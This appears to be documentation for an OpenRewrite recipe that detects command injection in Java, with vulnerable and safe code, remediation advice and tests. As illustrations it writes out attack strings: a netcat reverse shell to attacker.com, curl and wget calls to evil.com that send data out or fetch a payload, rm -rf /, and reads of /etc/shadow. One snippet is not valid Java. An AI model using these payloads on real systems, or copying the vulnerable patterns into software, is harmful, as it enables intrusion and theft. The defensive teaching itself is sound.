---
description: Detect and prevent command injection vulnerabilities in Java applications
---

# Command Injection Detection

Command injection vulnerabilities occur when untrusted data is passed to system commands, allowing attackers to execute arbitrary commands on the host operating system. This can lead to complete system compromise, data theft, or service disruption.

## Understanding command injection

Imagine giving someone remote control of your computer's command line. They could delete files, install malware, steal data, or shut down your system. Command injection vulnerabilities provide exactly this level of access to attackers through your application.

### The danger illustrated

```java
// VULNERABLE: User input directly in command
String filename = request.getParameter("file");
Process p = Runtime.getRuntime().exec("cat /logs/" + filename);

// Attack: file = "access.log; rm -rf /; echo"
// Executes: cat /logs/access.log; rm -rf /; echo
// Result: Attempts to delete everything!
```

## How OpenRewrite detects command injection

The `FindCommandInjection` recipe tracks untrusted data flowing into command execution methods:

### 1. Command execution sinks

```java
// Runtime execution
Runtime.getRuntime().exec(command)
Runtime.getRuntime().exec(commandArray)

// ProcessBuilder
new ProcessBuilder(commands).start()
new ProcessBuilder().command(commands).start()

// Apache Commons Exec
CommandLine cmdLine = CommandLine.parse(command)
DefaultExecutor executor = new DefaultExecutor()
executor.execute(cmdLine)
```

### 2. Common attack vectors

```java
// Shell metacharacters that enable command chaining
; && || | ` $() > < >> << & \n \r

// Example attacks:
"file.txt; cat /etc/passwd"          // Command chaining
"file.txt && curl evil.com/steal"    // Conditional execution  
"file.txt | mail attacker@evil.com"  // Pipe to another command
"$(cat /etc/passwd)"                  // Command substitution
"`rm -rf /`"                          // Backtick execution
```

## Vulnerable patterns

### Basic command injection

```java
// VULNERABLE - Direct concatenation
@PostMapping("/backup")
public String backup(@RequestParam String directory) {
    String command = "tar -czf backup.tar.gz " + directory;
    Process p = Runtime.getRuntime().exec(command);
    return "Backup created";
}
// Attack: directory = "/home/user; cat /etc/shadow > public/passwords.txt"
```

### Array-based commands (still vulnerable)

```java
// VULNERABLE - Even with array syntax
@GetMapping("/ping")
public String ping(@RequestParam String host) {
    String[] command = {"sh", "-c", "ping -c 4 " + host};
    Process p = Runtime.getRuntime().exec(command);
    return readOutput(p);
}
// Attack: host = "google.com; nc -e /bin/sh attacker.com 4444"
```

### ProcessBuilder vulnerabilities

```java
// VULNERABLE - ProcessBuilder with shell
@PostMapping("/convert")
public void convertFile(@RequestParam String input, @RequestParam String output) {
    List<String> command = Arrays.asList("sh", "-c", 
        "ffmpeg -i " + input + " " + output);
    new ProcessBuilder(command).start();
}
// Attack: input = "video.mp4; wget evil.com/malware.sh; sh malware.sh;"
```

### Path traversal in commands

```java
// VULNERABLE - Path traversal + command injection
@GetMapping("/logs")
public String viewLog(@RequestParam String logfile) {
    String command = "tail -n 100 /var/log/" + logfile;
    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
    return readOutput(p);
}
// Attack: logfile = "../../../etc/passwd; echo 'hacked' > /var/www/index.html"
```

## Safe patterns and remediation

### Avoid shell invocation

The safest approach is to avoid shell interpretation entirely.
```java
// SAFE - Direct command without shell
@GetMapping("/disk-usage")
public String diskUsage(@RequestParam String directory) {
    // Validate input first
    if (!isValidDirectory(directory)) {
        throw new IllegalArgumentException("Invalid directory");
    }
    
    // Use array form without shell
    String[] command = {"du", "-sh", directory};
    Process p = Runtime.getRuntime().exec(command);
    return readOutput(p);
}

// SAFE - ProcessBuilder without shell
@PostMapping("/compress")
public void compressFile(@RequestParam String filename) {
    // Whitelist validation
    if (!filename.matches("^[a-zA-Z0-9._-]+$")) {
        throw new IllegalArgumentException("Invalid filename");
    }
    
    ProcessBuilder pb = new ProcessBuilder(
        "gzip", 
        "-9", 
        "/safe/path/" + filename
    );
    pb.start();
}
```

### Input validation and sanitization

When shell execution is unavoidable, strictly validate input.
```java
public class CommandSanitizer {
    // Whitelist allowed characters
    private static final Pattern SAFE_PATTERN = Pattern.compile("^[a-zA-Z0-9._/-]+$");
    
    // Dangerous shell metacharacters
    private static final Set<String> DANGEROUS_CHARS = Set.of(
        ";", "&&", "||", "|", "`", "$", "(", ")", 
        ">", "<", "&", "\n", "\r", "*", "?", "[", "]"
    );
    
    public static String sanitize(String input) {
        // Reject if contains dangerous characters
        for (String dangerous : DANGEROUS_CHARS) {
            if (input.contains(dangerous)) {
                throw new IllegalArgumentException("Invalid characters in input");
            }
        }
        
        // Only allow whitelisted characters
        if (!SAFE_PATTERN.matcher(input).matches()) {
            throw new IllegalArgumentException("Input contains invalid characters");
        }
        
        return input;
    }
}
```

### Use higher-level APIs

Prefer Java APIs over system commands.
```java
// INSTEAD OF: Runtime.exec("mkdir -p " + path)
// USE:
Files.createDirectories(Paths.get(path));

// INSTEAD OF: Runtime.exec("cp " + src + " " + dst)  
// USE:
Files.copy(Paths.get(src), Paths.get(dst));

// INSTEAD OF: Runtime.exec("rm -f " + file)
// USE:
Files.deleteIfExists(Paths.get(file));

// INSTEAD OF: Runtime.exec("find " + dir + " -name " + pattern)
// USE:
Files.walk(Paths.get(dir))
     .filter(path -> path.getFileName().toString().matches(pattern))
     .collect(Collectors.toList());
```

### Parameterized commands

When external commands are necessary, use parameterization.
```java
public class SafeCommandExecutor {
    private static final Map<String, String[]> ALLOWED_COMMANDS = Map.of(
        "compress", new String[]{"gzip", "-9", "{}"},
        "backup", new String[]{"tar", "-czf", "{output}", "{input}"},
        "scan", new String[]{"clamscan", "--no-summary", "{}"}
    );
    
    public void executeCommand(String commandName, Map<String, String> params) {
        String[] template = ALLOWED_COMMANDS.get(commandName);
        if (template == null) {
            throw new IllegalArgumentException("Unknown command");
        }
        
        // Replace placeholders with validated parameters
        String[] command = Arrays.stream(template)
            .map(part -> replacePlaceholder(part, params))
            .toArray(String[]::new);
            
        new ProcessBuilder(command).start();
    }
    
    private String replacePlaceholder(String part, Map<String, String> params) {
        if (part.startsWith("{") && part.endsWith("}")) {
            String key = part.substring(1, part.length() - 1);
            String value = params.get(key);
            if (value == null) {
                throw new IllegalArgumentException("Missing parameter: " + key);
            }
            return sanitize(value);
        }
        return part;
    }
}
```

## Advanced detection features

### Context-aware analysis

The recipe considers how data flows through the program.
```java
// Tracks through method calls
public void processFile(HttpServletRequest request) {
    String filename = request.getParameter("file");  // TAINTED
    executeCommand(filename);
}

private void executeCommand(String file) {
    String cmd = buildCommand(file);  // Taint propagated
    Runtime.getRuntime().exec(cmd);   // VULNERABILITY detected
}

private String buildCommand(String input) {
    return "process " + input;  // Taint flows through
}
```

### Detecting laundered input

Even "cleaned" input might still be dangerous.
```java
// STILL VULNERABLE - Incomplete sanitization
public void execute(String userInput) {
    // This only removes some dangerous characters
    String "cleaned" = userInput.replace(";", "")
                               .replace("|", "")
                               .replace("&", "");
    
    // But what about $(), ``, \n, etc.?
    Runtime.getRuntime().exec("echo " + cleaned);  // Still vulnerable!
}
```

## Platform-specific considerations

### Windows vs. Unix commands

Different platforms have different dangerous characters.
```java
public class PlatformAwareValidator {
    public boolean isSafeForPlatform(String input) {
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            // Windows-specific dangerous characters
            return !input.matches(".*[&|<>^%].*");
        } else {
            // Unix-specific dangerous characters  
            return !input.matches(".*[;&|<>`$(){}\\[\\]\\n\\r].*");
        }
    }
}
```

### Docker and container commands

Special care with container orchestration.
```java
// VULNERABLE - Docker command injection
@PostMapping("/container/run")
public void runContainer(@RequestParam String image, @RequestParam String cmd) {
    String dockerCmd = "docker run " + image + " " + cmd;
    Runtime.getRuntime().exec(new String[]{"sh", "-c", dockerCmd});
}
// Attack: image = "ubuntu; docker run -v /:/host --privileged ubuntu sh -c 'cat /host/etc/shadow'"
```

## Testing command injection detection

### Unit tests

```java
@Test
void detectsBasicCommandInjection() {
    rewriteRun(
        java("""
            import java.io.*;
            
            class CommandExecutor {
                void executeUserCommand(String userInput) throws IOException {
                    ~~>Runtime.getRuntime().exec("ls " + userInput);
                }
            }
            """)
    );
}

@Test
void allowsSafeCommandExecution() {
    rewriteRun(
        java("""
            import java.io.*;
            
            class SafeExecutor {
                void listDirectory() throws IOException {
                    // Fixed command, no user input
                    Runtime.getRuntime().exec(new String[]{"ls", "-la", "/tmp"});
                }
            }
            """)
    );
}

@Test
void detectsProcessBuilderInjection() {
    rewriteRun(
        java("""
            import java.util.*;
            
            class ProcessExecutor {
                void runProcess(String userArg) throws IOException {
                    List<String> command = Arrays.asList("sh", "-c", "echo " + userArg);
                    ~~>new ProcessBuilder(command).start();
                }
            }
            """)
    );
}
```

## Common false positives

### Environment variables

```java
// May be flagged but could be safe if properly controlled
String javaHome = System.getenv("JAVA_HOME");
Process p = Runtime.getRuntime().exec(javaHome + "/bin/java -version");

// Better approach:
Path javaPath = Paths.get(System.getenv("JAVA_HOME"), "bin", "java");
Process p = Runtime.getRuntime().exec(new String[]{javaPath.toString(), "-version"});
```

### Configuration-based commands

```java
// From trusted configuration file
@Value("${app.backup.command}")
private String backupCommand;  // e.g., "/usr/bin/backup.sh"

public void runBackup() {
    // If configuration is trusted, this might be safe
    Runtime.getRuntime().exec(backupCommand);
}
```

## Severity and impact

Command injection is typically a **CRITICAL** severity vulnerability because:

1. **Complete System Compromise**: Attackers can execute any command the application can
2. **Data Exfiltration**: Access to all files the application can read
3. **Service Disruption**: Ability to delete files, kill processes, or consume resources
4. **Lateral Movement**: Pivot point for attacking other systems
5. **Privilege Escalation**: Potential to exploit SUID binaries or misconfigurations

## Real-world examples

Several major vulnerabilities have been command injection:

- **Shellshock (2014)**: Bash vulnerability allowing command injection via environment variables
- **ImageMagick (2016)**: Command injection through image processing
- **Log4Shell (2021)**: While primarily JNDI injection, often led to command execution

## Integration with CI/CD

### Pre-commit hook

```bash
#!/bin/bash
# .git/hooks/pre-commit

# Run command injection detection
mvn rewrite:run -Drecipe=org.openrewrite.analysis.java.security.FindCommandInjection

if [ $? -ne 0 ]; then
    echo "Command injection vulnerability detected. Commit blocked."
    exit 1
fi
```

## Next steps

- [SQL Injection](sql-injection.md) - Similar pattern for database commands
- [LDAP Injection](ldap-injection.md) - Directory service command injection
- [Path Traversal](path-traversal.md) - File system access vulnerabilities

:::danger Critical Security Issue
Command injection is one of the most dangerous vulnerabilities. Always validate input, avoid shell invocation when possible, and use parameterized commands. Never trust user input in system commands.
:::
